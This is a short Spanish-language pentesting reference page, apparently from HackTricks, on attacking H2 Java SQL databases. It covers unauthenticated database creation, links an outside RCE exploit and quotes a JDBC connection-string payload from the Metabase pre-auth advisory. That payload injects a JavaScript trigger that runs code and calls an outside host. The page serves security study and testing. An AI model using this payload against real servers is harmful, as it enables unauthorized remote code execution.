# H2 - Base de datos Java SQL

{{#include ../../banners/hacktricks-training.md}}

Página oficial: [https://www.h2database.com/html/main.html](https://www.h2database.com/html/main.html)

## Acceso

Puedes indicar un **nombre de base de datos no existente** para **crear una nueva base de datos sin credenciales válidas** (**no autenticado**):

![](<../../images/image (131).png>)

O si sabes que por ejemplo un **mysql está en ejecución** y conoces el **nombre de la base de datos** y las **credenciales** para esa base de datos, puedes acceder a ella:

![](<../../images/image (201).png>)

_**Truco de la caja Hawk de HTB.**_

## **RCE**

Teniendo acceso para comunicarte con la base de datos H2, revisa este exploit para obtener RCE en ella: [https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

## Inyección SQL de H2 a RCE

En [**esta publicación**](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) se explica un payload para obtener **RCE a través de una base de datos H2** abusando de una **Inyección SQL**.
```json
[...]
"details":
{
"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://example.com/pwn134').openConnection().getContentLength()\n$$--=x\\;",
"advanced-options": false,
"ssl": true
},
[...]
```
{{#include ../../banners/hacktricks-training.md}}
